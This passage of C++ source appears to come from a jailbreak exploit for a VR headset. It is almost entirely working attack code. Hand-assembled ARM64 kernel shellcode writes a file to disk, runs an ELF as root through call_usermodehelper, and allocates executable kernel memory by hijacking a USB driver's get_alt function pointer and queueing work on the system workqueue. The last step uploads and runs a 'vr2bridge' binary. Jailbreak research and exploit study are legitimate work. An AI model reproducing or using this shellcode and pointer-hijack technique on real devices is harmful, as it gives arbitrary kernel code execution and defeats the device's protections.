    write_data_fast(addr_filename, filename_data);
    write_u64_fast(addr_debug_flag, 0);

    std::vector<uint8_t> dump_sc = {
        // Prologue
        0xFD, 0x7B, 0xBE, 0xA9,  // 0x00: STP X29, X30, [SP, #-32]!
        0xF3, 0x53, 0x01, 0xA9,  // 0x04: STP X19, X20, [SP, #16]
        0xFD, 0x03, 0x00, 0x91,  // 0x08: MOV X29, SP

        // filp_open(filename, O_CREAT|O_TRUNC|O_WRONLY (0x241), 0755)
        0xE0, 0x02, 0x00, 0x58,  // 0x0C: LDR X0, pc+92 -> lit_filename
        0x21, 0x48, 0x80, 0x52,  // 0x10: MOV W1, #0x241
        0xA2, 0x3D, 0x80, 0x52,  // 0x14: MOV W2, #0x1ED
        0xC3, 0x02, 0x00, 0x58,  // 0x18: LDR X3, pc+88 -> lit_filp_open
        0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3
        0xF3, 0x03, 0x00, 0xAA,  // 0x20: MOV X19, X0 (Save struct file*)

        // kernel_write(filp, buf, size, pos=0)
        0xE0, 0x03, 0x13, 0xAA,  // 0x24: MOV X0, X19
        0x81, 0x02, 0x00, 0x58,  // 0x28: LDR X1, pc+80 -> lit_elf_buf
        0xA2, 0x02, 0x00, 0x58,  // 0x2C: LDR X2, pc+84 -> lit_elf_size
        0x03, 0x00, 0x80, 0xD2,  // 0x30: MOV X3, #0  <-- THE FIX: loff_t passed by value
        0xA4, 0x02, 0x00, 0x58,  // 0x34: LDR X4, pc+84 -> lit_kernel_write
        0x80, 0x00, 0x3F, 0xD6,  // 0x38: BLR X4

        // filp_close(filp, NULL)
        0xE0, 0x03, 0x13, 0xAA,  // 0x3C: MOV X0, X19
        0x01, 0x00, 0x80, 0xD2,  // 0x40: MOV X1, #0
        0x62, 0x02, 0x00, 0x58,  // 0x44: LDR X2, pc+76 -> lit_filp_close
        0x40, 0x00, 0x3F, 0xD6,  // 0x48: BLR X2

        // Write Execution Success Flag
        0xE0, 0x66, 0x82, 0xD2,  // 0x4C: MOV X0, #0x1337
        0x41, 0x02, 0x00, 0x58,  // 0x50: LDR X1, pc+72 -> lit_debug_flag
        0x20, 0x00, 0x00, 0xF9,  // 0x54: STR X0, [X1]

        // Epilogue
        0xF3, 0x53, 0x41, 0xA9,  // 0x58: LDP X19, X20, [SP, #16]
        0xFD, 0x7B, 0xC2, 0xA8,  // 0x5C: LDP X29, X30, [SP], #32
        0xC0, 0x03, 0x5F, 0xD6,  // 0x60: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x64: NOP (Aligns literal pool to 0x68)
    };

    pack_q(dump_sc, addr_filename);            // 0x68
    pack_q(dump_sc, constants::FILP_OPEN);     // 0x70
    pack_q(dump_sc, addr_elf_data);            // 0x78
    pack_q(dump_sc, elf_data.size());          // 0x80
    pack_q(dump_sc, constants::KERNEL_WRITE);  // 0x88
    pack_q(dump_sc, constants::FILP_CLOSE);    // 0x90
    pack_q(dump_sc, addr_debug_flag);          // 0x98

    write_data_fast(addr_shellcode, dump_sc);

    LOG_DEBUG << "[*] Executing native kernel disk write...\n";
    trigger_workqueue(addr_shellcode);

    uint64_t debug_flag = 0;

    for (int i = 0; i < 10; i++) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

        debug_flag = read_ptr(addr_debug_flag);

        if (debug_flag == 0x1337) {
            LOG_DEBUG << "[+] File dropped to " << target_path << "\n";
            return true;
        }
    }

    LOG_ERROR << "[-] Failed to upload " << target_path << "\n";
    return false;
}

bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std::string>& args) {
    LOG_DEBUG << "[*] Preparing to execute: " << target_path << "\n";
    if (!args.empty()) {
        std::ostringstream oss;
        oss << "[*] With arguments: ";
        for (const auto& a : args) oss << a << " ";
        oss << "\n";
        LOG_DEBUG << oss.str();
    }

    uint64_t addr_exec_sc = rwx_base + 0x300;
    uint64_t addr_debug = rwx_base + 0x3E0;
    uint64_t addr_argv = rwx_base + 0x400;     // Array of pointers
    uint64_t addr_envp = rwx_base + 0x600;     // Array of pointers
    uint64_t addr_strings = rwx_base + 0x800;  // Start writing string data here

    uint64_t str_cursor = addr_strings;
    std::vector<uint64_t> argv_ptrs;

    uint64_t ptr_path = str_cursor;
    std::vector<uint8_t> path_data(target_path.begin(), target_path.end());
    path_data.push_back(0);  // Null terminator
    write_data_fast(ptr_path, path_data);
    str_cursor += path_data.size();
    argv_ptrs.push_back(ptr_path);

    for (const auto& arg : args) {
        uint64_t ptr_arg = str_cursor;
        std::vector<uint8_t> arg_data(arg.begin(), arg.end());
        arg_data.push_back(0);  // Null terminator
        write_data_fast(ptr_arg, arg_data);
        str_cursor += arg_data.size();
        argv_ptrs.push_back(ptr_arg);
    }
    argv_ptrs.push_back(0);  // NULL terminator for the argv array

    std::vector<std::string> envs = {"PATH=/tmp/bin", "HOME=/", "TERM=xterm"};
    std::vector<uint64_t> envp_ptrs;

    for (const auto& env : envs) {
        uint64_t ptr_env = str_cursor;
        std::vector<uint8_t> env_data(env.begin(), env.end());
        env_data.push_back(0);
        write_data_fast(ptr_env, env_data);
        str_cursor += env_data.size();
        envp_ptrs.push_back(ptr_env);
    }
    envp_ptrs.push_back(0);  // NULL terminator for the envp array

    for (size_t i = 0; i < argv_ptrs.size(); i++) {
        write_u64_fast(addr_argv + (i * 8), argv_ptrs[i]);
    }

    for (size_t i = 0; i < envp_ptrs.size(); i++) {
        write_u64_fast(addr_envp + (i * 8), envp_ptrs[i]);
    }

    write_u64_fast(addr_debug, 0);

    std::vector<uint8_t> exec_sc = {
        0xFD, 0x7B, 0xBE, 0xA9,  // 0x00: STP X29, X30, [SP, #-32]!
        0xFD, 0x03, 0x00, 0x91,  // 0x04: MOV X29, SP

        // call_usermodehelper(path, argv, envp, UMH_WAIT_EXEC)
        0x80, 0x01, 0x00, 0x58,  // 0x08: LDR X0, pc+48 -> lit_path
        0xA1, 0x01, 0x00, 0x58,  // 0x0C: LDR X1, pc+52 -> lit_argv
        0xC2, 0x01, 0x00, 0x58,  // 0x10: LDR X2, pc+56 -> lit_envp
        0x03, 0x00, 0x80, 0xD2,  // 0x14: MOV X3, #1 (UMH_WAIT_EXEC)
        0xC4, 0x01, 0x00, 0x58,  // 0x18: LDR X4, pc+56 -> lit_call_usermodehelper
        0x80, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X4

        // Write Execution Success Flag
        0xC0, 0x01, 0x00, 0x58,  // 0x20: LDR X0, pc+56 -> lit_debug_flag
        0xE1, 0x66, 0x82, 0xD2,  // 0x24: MOV X1, #0x1337
        0x01, 0x00, 0x00, 0xF9,  // 0x28: STR X1, [X0]

        // Epilogue
        0xFD, 0x7B, 0xC2, 0xA8,  // 0x2C: LDP X29, X30, [SP], #32
        0xC0, 0x03, 0x5F, 0xD6,  // 0x30: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x34: NOP (Align)
    };

    // Literal Pool
    pack_q(exec_sc, ptr_path);             // 0x38 (Points to the string directly)
    pack_q(exec_sc, addr_argv);            // 0x40 (Points to the array of pointers)
    pack_q(exec_sc, addr_envp);            // 0x48 (Points to the array of pointers)
    pack_q(exec_sc, constants::CALL_UMH);  // 0x50
    pack_q(exec_sc, addr_debug);           // 0x58

    write_data_fast(addr_exec_sc, exec_sc);

    LOG_DEBUG << "[*] Triggering shellcode...\n";
    trigger_workqueue(addr_exec_sc);

    for (int i = 0; i < 100; i++) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
        if (read_ptr(addr_debug) == 0x1337) {
            LOG_DEBUG << "[+] " << target_path << " finished execution sequence.\n";
            return true;
        }
    }

    LOG_ERROR << "[-] Failed to execute ELF. Check kernel log.\n";
    return false;
}

bool KernelRW::setup_jb_env() {
    uint64_t __vmalloc_addr = constants::__VMALLOC_ADDR;
    uint64_t get_alt_ptr_addr = read_ptr(constants::SAUTH_SIEUSB) + constants::GET_ALT_OFFSET;

    // We already have the address, or we can get it from the headset in a known place.
    uint64_t current_ptr = read_ptr(constants::TEXT_ALLOC_BASE);

    if (current_ptr != rwx_base) {
        LOG_DEBUG << "[*] Detected existing allocation at 0x" << std::hex << current_ptr << "\n";
        rwx_base = current_ptr;
    }

    if (current_ptr == 0) {
        LOG_DEBUG << "[*] Setting up jailbreak env\n";

        uint64_t addr_worker = constants::TEXT_DATA + 0x00;       // Stage 2
        uint64_t addr_work_struct = constants::TEXT_DATA + 0x60;  // 32-byte struct
        uint64_t addr_irq = constants::TEXT_DATA + 0x80;          // Stage 1
        uint64_t addr_alloc_ptr = constants::TEXT_DATA + 0xD8;    // Final result slot
        uint64_t addr_debug_flag = constants::TEXT_DATA + 0xE0;   // Debug flag slot

        write_u64_fast(addr_alloc_ptr, 0);
        write_u64_fast(addr_debug_flag, 0);

        std::vector<uint8_t> payload;

        // __vmalloc(256KB, GFP_KERNEL, PAGE_KERNEL_EXEC)
        std::vector<uint8_t> stage2_sc = {
            0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
            0xFD, 0x03, 0x00, 0x91,  // 0x04: MOV X29, SP

            // Arg 0: Size (256 KB = 0x40000)
            0x00, 0x00, 0x80, 0xD2,  // 0x08: MOV X0, #0
            0x80, 0x00, 0xA0, 0xF2,  // 0x0C: MOVK X0, #0x4, LSL #16

            // Arg 1: GFP Mask (GFP_KERNEL = 0xD0)
            0x01, 0x1A, 0x80, 0xD2,  // 0x10: MOV X1, #0xD0

            // Arg 2: Protection (PAGE_KERNEL_EXEC = 0x713)
            0x62, 0xE2, 0x80, 0xD2,  // 0x14: MOV X2, #0x713

            0x83, 0x01, 0x00, 0x58,  // 0x18: LDR X3, pc+48 (Loads __vmalloc_addr from 0x48)
            0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3

            0x81, 0x01, 0x00, 0x58,  // 0x20: LDR X1, pc+48 (Loads addr_alloc_ptr from 0x50)
            0x20, 0x00, 0x00, 0xF9,  // 0x24: STR X0, [X1] (Save result to BSS)

            // --- Write Debug Flag (0x1337) ---
            0xE2, 0x66, 0x82, 0xD2,  // 0x28: MOV X2, #0x1337
            0x61, 0x01, 0x00, 0x58,  // 0x2C: LDR X1, pc+44 (Loads addr_debug_flag from 0x58)
            0x22, 0x00, 0x00, 0xF9,  // 0x30: STR X2, [X1]
            // ---------------------------------

            0x00, 0x00, 0x80, 0xD2,  // 0x34: MOV X0, #0
            0xFD, 0x7B, 0xC1, 0xA8,  // 0x38: LDP X29, X30, [SP], #0x10
            0xC0, 0x03, 0x5F, 0xD6,  // 0x3C: RET
            0x1F, 0x20, 0x03, 0xD5,  // 0x40: NOP (Align)
            0x1F, 0x20, 0x03, 0xD5   // 0x44: NOP (Align)
        };
        pack_q(stage2_sc, __vmalloc_addr);   // 0x48
        pack_q(stage2_sc, addr_alloc_ptr);   // 0x50
        pack_q(stage2_sc, addr_debug_flag);  // 0x58
        payload.insert(payload.end(), stage2_sc.begin(), stage2_sc.end());

        uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0;
        uint64_t entry_addr = addr_work_struct + 0x08;
        pack_q(payload, WORK_STRUCT_NO_POOL);  // 0x60
        pack_q(payload, entry_addr);           // 0x68
        pack_q(payload, entry_addr);           // 0x70
        pack_q(payload, addr_worker);          // 0x78

        std::vector<uint8_t> stage1_sc = {
            0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!

            // Flush Cache Line 1, 2 & 3
            0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 (Loads addr_worker from 0xD8)
            0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x0C: IC IVAU, X4
            0x84, 0x00, 0x01, 0x91,  // 0x10: ADD X4, X4, #64
            0x24, 0x7B, 0x0B, 0xD5,  // 0x14: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x18: IC IVAU, X4
            0x84, 0x00, 0x01, 0x91,  // 0x1C: ADD X4, X4, #64
            0x24, 0x7B, 0x0B, 0xD5,  // 0x20: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
            0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
            0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB

            0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
            0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 (Loads SYSTEM_WQ from 0xE0)
            0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]  (Deref system_wq)
            0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 (Loads addr_work_struct from 0xE8)
            0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 (Loads QUEUE_WORK_ON from 0xF0)
            0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3
            0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
            0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
            0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
            0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Align)
        };
        pack_q(stage1_sc, addr_worker);               // 0x58 -> 0xD8
        pack_q(stage1_sc, constants::SYSTEM_WQ);      // 0x60 -> 0xE0
        pack_q(stage1_sc, addr_work_struct);          // 0x68 -> 0xE8
        pack_q(stage1_sc, constants::QUEUE_WORK_ON);  // 0x70 -> 0xF0
        payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());

        LOG_DEBUG << "[*] Writing unified payload (0x" << std::hex << payload.size() << " bytes)...\n";
        if (!write_data_fast(constants::TEXT_DATA, payload)) return false;

        LOG_DEBUG << "[*] Hijacking get_alt to point to IRQ trigger...\n";
        write_u64_fast(get_alt_ptr_addr, addr_irq);

        LOG_DEBUG << "[*] Triggering USB alternate setting request...\n";
        usb->trigger_get_alt();

        LOG_DEBUG << "[*] Waiting for kworker to provision 256KB RWX memory...\n";

        uint64_t debug_flag = 0;

        for (int i = 0; i < 10; i++) {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));

            debug_flag = read_ptr(addr_debug_flag);
            rwx_base = read_ptr(addr_alloc_ptr);

            if (debug_flag == 0x1337) {
                break;
            }
        }

        if (debug_flag == 0x1337 && rwx_base != 0) {
            LOG_DEBUG << "[+] 256KB RWX Buffer natively allocated at: 0x" << std::hex << rwx_base << "\n";
            patch_rwx(rwx_base, 0x40000);
            execute_tlb_flush();

            write_u64_fast(constants::TEXT_ALLOC_BASE, rwx_base);

            // Upload and execute vr2bridge
            upload_to_tmp(Utils::get_executable_relative_path("vr2bridge"), "vr2bridge");
            execute_elf("/tmp/vr2bridge", {});

            return true;
        } else {
            LOG_ERROR << "[-] Allocation failed. Debug: 0x" << std::hex << debug_flag << ", Ptr: 0x" << std::hex << rwx_base << "\n";
            return false;
        }
    }

    return true;
}